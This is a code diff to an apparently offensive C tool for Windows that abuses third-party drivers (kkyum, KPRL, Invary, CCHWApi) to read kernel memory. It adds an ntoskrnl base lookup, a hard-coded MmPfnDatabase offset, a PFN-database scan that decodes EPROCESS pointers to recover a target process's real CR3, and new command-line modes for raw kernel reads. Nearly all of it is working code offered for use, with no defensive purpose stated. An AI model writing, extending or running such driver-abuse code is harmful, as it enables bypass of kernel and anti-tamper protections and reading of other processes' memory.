@@ -1627,25 +1627,147 @@ static uint32_t parse_nt_export_rva(const char *name) {
     return out;
 }
 
+static uint64_t g_nt_base_override = 0;
+
+// Fallback without SeDebug/EnumDeviceDrivers: NtQuerySystemInformation(
+// SystemModuleInformation=11) returns kernel module bases and is usually
+// available to a normal administrator token.
+typedef struct {
+    HANDLE Section;
+    PVOID MappedBase;
+    PVOID ImageBase;
+    ULONG ImageSize;
+    ULONG Flags;
+    USHORT LoadOrderIndex;
+    USHORT InitOrderIndex;
+    USHORT LoadCount;
+    USHORT OffsetToFileName;
+    UCHAR FullPathName[256];
+} MB_RTL_PROCESS_MODULE_INFORMATION;
+
+typedef LONG (NTAPI *MbNtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
+
 static uint64_t find_ntoskrnl_base(void) {
+    extern uint64_t g_nt_base_override;
+    if (g_nt_base_override) return g_nt_base_override;
     DWORD needed = 0;
     uint64_t base = 0;
-    if (!EnumDeviceDrivers(NULL, 0, &needed) || !needed) return 0;
-    LPVOID *arr = (LPVOID *)malloc(needed);
-    DWORD got = 0;
-    if (arr && EnumDeviceDrivers(arr, needed, &got)) {
-        int count = (int)(got / sizeof(LPVOID));
-        for (int i = 0; i < count; i++) {
-            char nm[MAX_PATH] = { 0 };
-            if (GetDeviceDriverBaseNameA(arr[i], nm, sizeof(nm)) &&
-                (_stricmp(nm, "ntoskrnl.exe") == 0 || _stricmp(nm, "ntkrnlmp.exe") == 0)) {
-                base = (uint64_t)(uintptr_t)arr[i];
+    if (EnumDeviceDrivers(NULL, 0, &needed) && needed) {
+        LPVOID *arr = (LPVOID *)malloc(needed);
+        DWORD got = 0;
+        if (arr && EnumDeviceDrivers(arr, needed, &got)) {
+            int count = (int)(got / sizeof(LPVOID));
+            for (int i = 0; i < count; i++) {
+                char nm[MAX_PATH] = { 0 };
+                if (GetDeviceDriverBaseNameA(arr[i], nm, sizeof(nm)) &&
+                    (_stricmp(nm, "ntoskrnl.exe") == 0 || _stricmp(nm, "ntkrnlmp.exe") == 0)) {
+                    base = (uint64_t)(uintptr_t)arr[i];
+                    break;
+                }
+            }
+        }
+        free(arr);
+        if (base) return base;
+    }
+
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    MbNtQuerySystemInformation_t q = ntdll
+        ? (MbNtQuerySystemInformation_t)GetProcAddress(ntdll, "NtQuerySystemInformation")
+        : NULL;
+    if (!q) return 0;
+    ULONG len = 0;
+    q(11, NULL, 0, &len);  // SystemModuleInformation
+    if (len < 0x100 || len > 0x4000000) return 0;
+    uint8_t *buf = (uint8_t *)malloc(len + 0x1000);
+    if (!buf) return 0;
+    ULONG got = 0;
+    LONG st = q(11, buf, len + 0x1000, &got);
+    if (st == 0 && got >= 8) {
+        uint32_t count = *(uint32_t *)buf;
+        MB_RTL_PROCESS_MODULE_INFORMATION *mods =
+            (MB_RTL_PROCESS_MODULE_INFORMATION *)(buf + 8);
+        for (uint32_t i = 0; i < count; i++) {
+            char *nm = (char *)mods[i].FullPathName + mods[i].OffsetToFileName;
+            if (strstr(nm, "ntoskrnl") || strstr(nm, "ntkrnlmp")) {
+                base = (uint64_t)(uintptr_t)mods[i].ImageBase;
                 break;
             }
         }
     }
-    free(arr);
+    free(buf);
     return base;
+}
+
+// Recover the real CR3 via the PFN database trick:
+// for a CR3 page frame, _MMPFN.ListEntry.Flink points to the owning
+// _KPROCESS/_EPROCESS. Scan MmPfnDatabase entries for eproc and return
+// the PFN << 12 as the candidate real CR3.
+static int pfn_recover_cr3(uint64_t nt_base, uint64_t eproc, uint32_t max_pfn, uint64_t *out_cr3) {
+    mb_kernel_reader kr;
+    kr.ctx = NULL;
+    kr.read = kkyum_kread;
+
+    // nt!MmPfnDatabase RVA for this ntoskrnl build (from crash-dump PDB symbols).
+    const uint64_t MMPFN_DATABASE_RVA = 0xFC7C38ull;
+    uint64_t pfn_db = 0;
+    if (!kr.read(&kr, nt_base + MMPFN_DATABASE_RVA, &pfn_db, 8)) {
+        fprintf(stderr, "[ERR] pfn: read MmPfnDatabase pointer failed\n");
+        return 0;
+    }
+    fprintf(stderr, "[DBG] pfn: nt=0x%llX db=0x%llX eproc=0x%llX max=0x%X\n",
+            (unsigned long long)nt_base, (unsigned long long)pfn_db,
+            (unsigned long long)eproc, max_pfn);
+    if (pfn_db < 0xFFFF800000000000ull) return 0;
+
+    const uint32_t CHUNK_ENTRIES = 0x2000;  // 8192 * 0x30 = 0x18000 bytes
+    const uint32_t PFN_SIZE = 0x30;
+    // Encrypted EPROCESS form used by _MMPFN ListEntry/flags:
+    // eproc = ((flags | 0xF000000000000000) >> 0xD) | 0xFFFF000000000000
+    uint64_t enc_eproc = ((eproc & 0x0000FFFFFFFFFFFFull) << 13) | 0xF000000000000000ull;
+    fprintf(stderr, "[DBG] pfn: enc_eproc=0x%llX\n", (unsigned long long)enc_eproc);
+    uint8_t *buf = (uint8_t *)malloc(CHUNK_ENTRIES * PFN_SIZE);
+    if (!buf) return 0;
+    int found = 0;
+    uint32_t printed = 0;
+    for (uint32_t start = 0; start < max_pfn && !found; start += CHUNK_ENTRIES) {
+        uint32_t n = max_pfn - start;
+        if (n > CHUNK_ENTRIES) n = CHUNK_ENTRIES;
+        uint64_t va = pfn_db + (uint64_t)start * PFN_SIZE;
+        if (!kr.read(&kr, va, buf, n * PFN_SIZE)) {
+            fprintf(stderr, "[ERR] pfn: read chunk PFN 0x%X failed\n", start);
+            break;
+        }
+        for (uint32_t i = 0; i < n; i++) {
+            uint8_t *entry = buf + (size_t)i * PFN_SIZE;
+            uint64_t w0 = *(uint64_t *)(entry + 0x00);
+            uint64_t w18 = *(uint64_t *)(entry + 0x18);
+            uint64_t w20 = *(uint64_t *)(entry + 0x20);
+            uint64_t w28 = *(uint64_t *)(entry + 0x28);
+            if (printed < 4) {
+                fprintf(stderr, "[DBG] pfn[0x%X] w0=0x%llX w18=0x%llX w20=0x%llX w28=0x%llX\n",
+                        start + i, (unsigned long long)w0, (unsigned long long)w18,
+                        (unsigned long long)w20, (unsigned long long)w28);
+                printed++;
+            }
+            uint64_t cand[4] = { w0, w18, w20, w28 };
+            int match = 0;
+            for (int j = 0; j < 4; j++) {
+                if (cand[j] == enc_eproc || cand[j] == eproc) { match = 1; break; }
+                uint64_t dec = ((cand[j] | 0xF000000000000000ull) >> 13) | 0xFFFF000000000000ull;
+                if (dec == eproc) { match = 1; break; }
+            }
+            if (match) {
+                uint64_t cr3 = ((uint64_t)(start + i)) << 12;
+                fprintf(stderr, "[OK] pfn: match PFN=0x%X CR3=0x%llX\n",
+                        start + i, (unsigned long long)cr3);
+                if (out_cr3) *out_cr3 = cr3;
+                found = 1;
+                break;
+            }
+        }
+    }
+    free(buf);
+    return found;
 }
 
 // Full kkyum locator: open device, find ntoskrnl, read PsInitialSystemProcess,
@@ -2688,6 +2810,7 @@ static void usage(void) {
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
     printf("  layers --locate --invary --pid <pid> [--invary-device <path>] (Invary Sensor kernel-VA locator)\n");
     printf("  layers --cchwapi-cr3-current [--device \\\\.\\CCHWAPI]  (low-risk CCHWApi 2.9 control-register CR3 only)\n");
+    printf("  layers --pfn-cr3 --eproc <hex> [--nt-base <hex>] [--pfn-max <n>]  (PFN-database CR3 recovery)\n");
     printf("  layers --locate --cchwapi-only --pid <pid> [--device \\\\.\\CCHWAPI]  (CCHWApi 2.9 only: control-reg CR3 + page-table walk, no scan)\n");
     printf("  layers --locate --scan-providers --pid <pid> [--auto-ranges | --scan-start <hex> --scan-size <hex>] [--va <hex> --size <n>]  (try 20 physical providers)\n");
     printf("  layers --locate --scan-bench --pid <pid> ...  (same, print per-provider open/scan timing)\n");
@@ -2707,7 +2830,8 @@ int main(int argc, char **argv) {
     int do_selftest = 0, do_read_phys = 0, do_write_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
     int use_la57 = 0, do_translate_only = 0;
     const char *data_hex = NULL;
-    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, use_auto = 0, use_scan_providers = 0, use_cchwapi_only = 0, do_cchwapi_current = 0, do_translate_debug = 0, do_scan_bench = 0, do_invary_read = 0, do_read_process = 0, do_probe = 0, do_probe_loc = 0, do_probe_all = 0, do_list = 0, do_list_legacy = 0, do_hvci = 0;
+    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, use_auto = 0, use_scan_providers = 0, use_cchwapi_only = 0, do_cchwapi_current = 0, do_translate_debug = 0, do_scan_bench = 0, do_invary_read = 0, do_read_process = 0, do_probe = 0, do_probe_loc = 0, do_probe_all = 0, do_list = 0, do_list_legacy = 0, do_hvci = 0, do_kkyum_kbase = 0, do_kkyum_kread = 0, do_pfn_cr3 = 0, have_eproc = 0;
+    uint64_t pfn_eproc = 0, pfn_max = 0x200000;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
         else if (strcmp(argv[i], "--probe-readers") == 0) do_probe = 1;
@@ -2747,6 +2871,12 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--cchwapi-only") == 0) use_cchwapi_only = 1;
         else if (strcmp(argv[i], "--cchwapi-cr3-current") == 0) do_cchwapi_current = 1;
         else if (strcmp(argv[i], "--translate-debug") == 0) do_translate_debug = 1;
+        else if (strcmp(argv[i], "--kkyum-kbase") == 0) do_kkyum_kbase = 1;
+        else if (strcmp(argv[i], "--kkyum-kread") == 0) do_kkyum_kread = 1;
+        else if (strcmp(argv[i], "--pfn-cr3") == 0) do_pfn_cr3 = 1;
+        else if (strcmp(argv[i], "--eproc") == 0 && i + 1 < argc) { pfn_eproc = _strtoui64(argv[++i], NULL, 0); have_eproc = 1; }
+        else if (strcmp(argv[i], "--pfn-max") == 0 && i + 1 < argc) pfn_max = _strtoui64(argv[++i], NULL, 0);
+        else if (strcmp(argv[i], "--nt-base") == 0 && i + 1 < argc) g_nt_base_override = _strtoui64(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--scan-bench") == 0) { use_scan_providers = 1; do_scan_bench = 1; }
         else if (strcmp(argv[i], "--scan-mock") == 0) { use_scan_providers = 1; g_scan_mock = 1; }
         else if (strcmp(argv[i], "--invary-read") == 0) do_invary_read = 1;
@@ -2760,6 +2890,43 @@ int main(int argc, char **argv) {
     if (do_probe) return probe_readers();
     if (do_probe_all) return probe_all();
     if (do_list) return list_providers();
+    if (do_kkyum_kbase || do_kkyum_kread || do_pfn_cr3) {
+        if (!kkyum_open(kkyum_device)) return 3;
+        mb_kernel_reader kr;
+        kr.ctx = NULL;
+        kr.read = kkyum_kread;
+        if (do_pfn_cr3) {
+            if (!have_eproc) { printf("[ERR] --pfn-cr3 needs --eproc\n"); return 6; }
+            uint64_t nt = g_nt_base_override ? g_nt_base_override : find_ntoskrnl_base();
+            if (!nt) { printf("[ERR] --pfn-cr3: nt base unknown; pass --nt-base\n"); return 6; }
+            uint64_t cr3 = 0;
+            int ok = pfn_recover_cr3(nt, pfn_eproc, (uint32_t)pfn_max, &cr3);
+            if (!ok) { printf("VERDICT=FAIL\n"); return 5; }
+            printf("EPROCESS=0x%llX REAL_CR3=0x%llX\n",
+                   (unsigned long long)pfn_eproc, (unsigned long long)cr3);
+            printf("VERDICT=PASS\n");
+            return 0;
+        }
+        if (do_kkyum_kbase) {
+            uint64_t b = find_ntoskrnl_base();
+            printf("NT_BASE=0x%llX\n", (unsigned long long)b);
+        }
+        if (do_kkyum_kread) {
+            if (!have_va || size == 0) { printf("[ERR] --kkyum-kread needs --va and --size\n"); return 6; }
+            uint8_t *buf = (uint8_t *)calloc(1, size);
+            if (!buf || !kr.read(&kr, va, buf, size)) {
+                printf("[ERR] kkyum kernel read failed VA=0x%llX size=0x%X\n",
+                       (unsigned long long)va, size);
+                free(buf);
+                return 5;
+            }
+            printf("VA=0x%llX SIZE=0x%X HEX=", (unsigned long long)va, size);
+            for (uint32_t i = 0; i < size; i++) printf("%02X", buf[i]);
+            printf("\nVERDICT=PASS\n");
+            free(buf);
+        }
+        return 0;
+    }
     if (do_cchwapi_current) {
         mb_phys_reader pr;
         if (!reader_open(&pr, "cchwapi", device)) return 3;
